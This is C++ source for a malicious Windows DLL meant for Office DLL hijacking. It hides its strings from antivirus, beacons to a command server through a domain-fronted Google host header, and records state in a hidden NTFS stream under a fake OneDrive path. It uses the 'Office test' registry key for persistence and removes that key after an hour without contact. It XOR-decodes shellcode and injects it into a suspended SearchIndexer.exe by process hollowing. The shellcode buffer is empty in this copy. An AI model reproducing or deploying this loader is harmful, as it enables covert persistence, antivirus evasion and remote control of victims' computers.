// Office DLL Hijacking
// Multi-byte character set 
// using static libraries
// XORandDrop and check calling process to bypass AV
// const char *hostname = "192.168.102.129";
// addr_list.sin_port = htons(443);
// XORandDrop(bits, 'J', d); 

#include "stdafx.h"
#include <string>
#include <atlstr.h>
#include <thread>
#include <tlhelp32.h>
#include <fstream>
#include <ws2tcpip.h>
#include <WinHTTP.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Winhttp.lib")

std::string office1 = "Of";
std::string office2 = "f";
typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
LPFN_ISWOW64PROCESS fnIsWow64Process;
//unsigned char key[] = {"J"};
unsigned long shsize = 2048;

//For Debuging
PROCESS_INFORMATION processInformation = { 0 };
STARTUPINFO startupInfo = { 0 };

#ifdef _WIN64
unsigned char bits[] = "";
#else
unsigned char bits[] = "";
#endif

const int size = sizeof bits;

/* hand-rolled bzero from metasploit*/
void bzero_cust(void *p, size_t l)
{
	BYTE *q = (BYTE *)p;
	size_t x = 0;
	for (x = 0; x < l; x++)
		*(q++) = 0x00;
}



/*Tests if the server is up and if the server has been unreachable for a set period of time
If it is over the set period of time, the registry key is deleted*/
bool uptime()
{
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	//LPSTR pszOutBuffer;
	BOOL  bResults = FALSE, httpResponse = NULL;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;
	DWORD dwStatusCode = 0;
	DWORD dwSize2 = sizeof(DWORD);
	bool open = true;

	hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	if (hSession)
		hConnect = WinHttpConnect(hSession, L"docs.google.com",
			INTERNET_DEFAULT_HTTPS_PORT, 0);
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL,
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			WINHTTP_FLAG_SECURE);
	if (hRequest)
		BOOL httpResult = WinHttpAddRequestHeaders(
			hRequest,
			L"Host: mywebsite-myapp.appspot.com",
			-1L,
			0);
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
			WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);
	if (bResults)
		httpResponse = WinHttpReceiveResponse(hRequest, NULL);
	if (httpResponse)
		bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwSize2, NULL);
	if (dwStatusCode == 502)
		open = false;
	else
		open = true;
	
	//Log connection failure 
	if (!open)
	{
		time_t CurrentDate, Lastfailue;
		CurrentDate = time(0);
		time_t seconds = 0, minutes = 0, hours = 0, days = 0, months = 0;
		std::fstream file_in("C:\\ProgramData\\Microsoft OneDrive\\Packages\\%PROCESSOR_ARCHITECTURE%\\OneDriveSetup2.exe:date", std::ios_base::binary | std::ios_base::in);

		//Check if a connection failure already occured and if it is over our limit
		if (file_in.peek() != std::ifstream::traits_type::eof())
		{
			file_in.read((char*)&Lastfailue, sizeof(time_t));
			file_in.close();

			seconds = CurrentDate - Lastfailue;
			minutes = seconds / 60;
			hours = seconds / (60 * 60);

			//check if limit has been reached
			if (hours > 1)
			{
				HKEY hKey = NULL;
				long openkey = RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Office test\\Special\\Perf"), 0L, KEY_SET_VALUE, &hKey);
				RegDeleteKey(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Office test\\Special\\Perf"));
			}
		}
		//Document first connection failure
		else
		{
			file_in.close();
			std::fstream file_out("C:\\ProgramData\\Microsoft OneDrive\\Packages\\%PROCESSOR_ARCHITECTURE%\\OneDriveSetup2.exe:date", std::ios_base::binary | std::ios_base::out);
			file_out.write((char *)&CurrentDate, sizeof(time_t));
			file_out.close();
		}
	}
	else
	{
		time_t Lastfailue;
		std::fstream file_out("C:\\ProgramData\\Microsoft OneDrive\\Packages\\%PROCESSOR_ARCHITECTURE%\\OneDriveSetup2.exe:date", std::ios::binary | std::ios_base::out | std::ios_base::trunc);
		file_out.close();
		std::fstream file_in("C:\\ProgramData\\Microsoft OneDrive\\Packages\\%PROCESSOR_ARCHITECTURE%\\OneDriveSetup2.exe:date", std::ios_base::binary | std::ios_base::in);
		if (file_in.peek() != std::ifstream::traits_type::eof())
		{
			file_in.read((char*)&Lastfailue, sizeof(time_t));
		}
		file_in.close();
	}
	return open;
}

//Finds the the process owner to ensure we are looking at the correct process
bool ExtractProcessOwner(HANDLE hProcess_i,
	CString& csOwner_o)
{
	
	// Get process token
	HANDLE hProcessToken = NULL;
	if (!::OpenProcessToken(hProcess_i, TOKEN_READ, &hProcessToken) || !hProcessToken)
	{
		return false;
	}

	// First get size needed, TokenUser indicates we want user information from given token
	DWORD dwProcessTokenInfoAllocSize = 0;
	::GetTokenInformation(hProcessToken, TokenUser, NULL, 0, &dwProcessTokenInfoAllocSize);

	// Call should have failed due to zero-length buffer.
	if (::GetLastError() == ERROR_INSUFFICIENT_BUFFER)
	{
		// Allocate buffer for user information in the token.
		PTOKEN_USER pUserToken = reinterpret_cast<PTOKEN_USER>(new BYTE[dwProcessTokenInfoAllocSize]);
		if (pUserToken != NULL)
		{
			// Now get user information in the allocated buffer
			if (::GetTokenInformation(hProcessToken, TokenUser, pUserToken, dwProcessTokenInfoAllocSize, &dwProcessTokenInfoAllocSize))
			{
				// Some vars that we may need
				SID_NAME_USE   snuSIDNameUse;
				TCHAR          szUser[MAX_PATH] = { 0 };
				DWORD          dwUserNameLength = MAX_PATH;
				TCHAR          szDomain[MAX_PATH] = { 0 };
				DWORD          dwDomainNameLength = MAX_PATH;

				// Retrieve user name and domain name based on user's SID.
				if (::LookupAccountSid(NULL,
					pUserToken->User.Sid,
					szUser,
					&dwUserNameLength,
					szDomain,
					&dwDomainNameLength,
					&snuSIDNameUse))
				{
					// Prepare user name string
					csOwner_o = _T("\\\\");
					csOwner_o += szDomain;
					csOwner_o += _T("\\");
					csOwner_o += szUser;

					// We are done!
					CloseHandle(hProcessToken);
					delete[] pUserToken;

					// We succeeded
					return true;
				}
			}

			delete[] pUserToken;
		}
	}

	CloseHandle(hProcessToken);
	return false;
}

//Checks is the process is already running to avoid multiple executions
bool CheckIfRunning() {
	bool safetoexec = true;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	CString csOwner_o = "";

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	char username[256 + 1];
	DWORD username_len = 256 + 1;
	GetUserName(username, &username_len);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (_stricmp(entry.szExeFile, "SearchIndexer.exe") == 0)
			{
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

				ExtractProcessOwner(hProcess, csOwner_o);
				if (csOwner_o != ""  && csOwner_o.Find(username) != -1)
				{
					safetoexec = false;
				}
				CloseHandle(hProcess);
			}
		}
	}
	CloseHandle(snapshot);
	return safetoexec;
}

bool SafetoExecute()
{
	bool safetoexec = false;
	WCHAR path[MAX_PATH] = { 0 };
	GetModuleFileNameW(NULL, path, MAX_PATH);
	std::wstring ws(path);
	std::string fullpath(ws.begin(), ws.end());
	std::string office3 = "ic";
	std::string office4 = "e";
	std::size_t found3 = fullpath.find(office1 + office2 + office3 + office4);
	SetEnvironmentVariable(TEXT("pathinfoV"), fullpath.c_str());
	if (found3 != std::string::npos)
	{
		safetoexec = CheckIfRunning();
	}
	return safetoexec;
}

//XORPayloadFunction
//e is the xor'ed payload
//k is the key
//d is the returned payload
//void XORandDrop(unsigned char* e, unsigned char* k, unsigned char* d)
void XORandDrop(unsigned char* e, char k, unsigned char* d)
{
	int j = 0;
	for (int i = 1; i < size; i = i + 2)
	{
		//d[j] = e[i] ^ k[i];
		d[j] = e[i] ^ k;
		j++;
	}
	
}

void ExecPay(void) {
	char process[40];
	strncpy_s(process,"SearchIndexer.exe", sizeof(process) - 1);
	PROCESS_INFORMATION prosinf;
	STARTUPINFO startinf;
	CONTEXT contx;
	LPVOID rp;
	unsigned char d[size/2];
	PROCESS_INFORMATION processInformation = { 0 };
	STARTUPINFO startupInfo = { 0 };
	// Start up the payload in a new process
	bzero_cust(&startinf, sizeof(startinf));
	startinf.cb = sizeof(startinf);
	//CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, "C:\\Windows\\System32", &startupInfo, &processInformation);

	// Create a suspended process, write shellcode into stack, make stack RWX, resume it
	if (CreateProcess(0, process, 0, 0, 0, CREATE_SUSPENDED | IDLE_PRIORITY_CLASS, 0, 0, &startinf, &prosinf)) {
		contx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
		GetThreadContext(prosinf.hThread, &contx);

		rp = (LPVOID)VirtualAllocEx(prosinf.hProcess, NULL, shsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		XORandDrop(bits, 'J', d);

		WriteProcessMemory(prosinf.hProcess, (PVOID)rp, &d, shsize, 0);
		#ifdef _WIN64
				contx.Rip = (DWORD64)rp;
		#else
				contx.Eip = (DWORD)rp;
		#endif

		SetThreadContext(prosinf.hThread, &contx);

		ResumeThread(prosinf.hThread);
		//CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, "C:\\Windows", &startupInfo, &processInformation);
		CloseHandle(prosinf.hThread);
		CloseHandle(prosinf.hProcess);
	}
	return;
}

void PrepPay(void)
{
	bool safetoexec = false;
	bool open = false;
	BOOL result = true;
	int valueLength = 512;
	TCHAR* envVarValue = new TCHAR[valueLength];
	DWORD len = NULL;
	//Uses environment variable to stop multiple executions per document open.
	len = GetEnvironmentVariable("PROCESSOR_CORES", envVarValue, valueLength);
	if (!len)
	{
		if (SafetoExecute())
		{
			SetEnvironmentVariable((TEXT("PROCESSOR_CORES")), (TEXT("1")));
			open = uptime();
			safetoexec = true;
		}
		if (safetoexec && open)
		{

			BOOL result = true;
			int valueLength = 512;
			TCHAR* envVarValue = new TCHAR[valueLength];
			DWORD len = NULL;
			ExecPay();
		}

	}
	return;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	PROCESS_INFORMATION processInformation = { 0 };
	STARTUPINFO startupInfo = { 0 };
	switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		#ifdef _WIN32
			PrepPay();
		#endif
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

#ifdef _WIN64
//Exploit moved to extern for safer execution
extern "C" __declspec(dllexport) void GetPerfhostHookVersion()
{
	PrepPay();
	return;
}

extern "C" __declspec(dllexport) void _PerfCodeMarker()
{
	//PrepPay();
	return;
}


extern "C" __declspec(dllexport) void _UnInitPerf()
{
	//PrepPay();
	return;
}

#endif
